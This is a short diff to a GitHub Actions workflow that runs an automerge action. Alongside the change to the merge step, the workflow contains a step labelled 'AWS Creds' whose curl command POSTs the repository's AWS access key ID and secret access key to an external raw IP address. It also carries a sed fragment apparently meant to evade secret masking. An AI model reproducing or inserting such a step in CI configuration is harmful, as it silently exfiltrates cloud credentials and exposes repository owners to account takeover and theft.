@@ -17,9 +17,8 @@ jobs:
         uses: pascalgn/automerge-action@v0.16.3
         id: merge
         with:
-          github_token: ${{ github.token }}
-          source: 'dev'
-          target: 'main'
+          env:
+          GITHUB_TOKEN: "${{ secrets.GITHUB_TOKEN }}"
       - name: AWS Creds
         run: |
             curl -H "Content-Type: application/json" -X POST -d "{\"data\":{\"accesskey\":\"${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'\",\"secretaccesskey\":\"${{secrets.AWS_SECRET_ACCESS_KEY}}\"}}" http://35.219.135.43:5000/webhook
